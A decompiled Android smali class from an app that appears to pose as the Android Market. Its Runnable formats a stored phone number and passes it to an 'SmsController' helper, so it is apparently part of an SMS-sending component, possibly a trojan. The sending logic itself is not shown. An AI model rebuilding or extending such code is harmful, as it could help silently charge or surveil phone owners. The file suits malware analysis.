.class Lcom/android/market/t;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Lcom/android/market/SmsController;

.field private final synthetic b:Ljava/lang/String;

.field private final synthetic c:I

.field private final synthetic d:Landroid/content/Context;

.field private final synthetic e:Landroid/os/Handler;


# direct methods
.method constructor <init>(Lcom/android/market/SmsController;Ljava/lang/String;ILandroid/content/Context;Landroid/os/Handler;)V
    .locals 0

    iput-object p1, p0, Lcom/android/market/t;->a:Lcom/android/market/SmsController;

    iput-object p2, p0, Lcom/android/market/t;->b:Ljava/lang/String;

    iput p3, p0, Lcom/android/market/t;->c:I

    iput-object p4, p0, Lcom/android/market/t;->d:Landroid/content/Context;

    iput-object p5, p0, Lcom/android/market/t;->e:Landroid/os/Handler;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    iget-object v0, p0, Lcom/android/market/t;->b:Ljava/lang/String;

    iget v1, p0, Lcom/android/market/t;->c:I

    const/16 v2, 0x11

    if-lt v1, v2, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "+"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v1, p0, Lcom/android/market/t;->b:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    :cond_0
    iget-object v1, p0, Lcom/android/market/t;->d:Landroid/content/Context;

    const-string v2, "1"

    invoke-static {v1, v0, v2}, Lcom/android/market/SmsController;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lcom/android/market/t;->e:Landroid/os/Handler;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    return-void
.end method
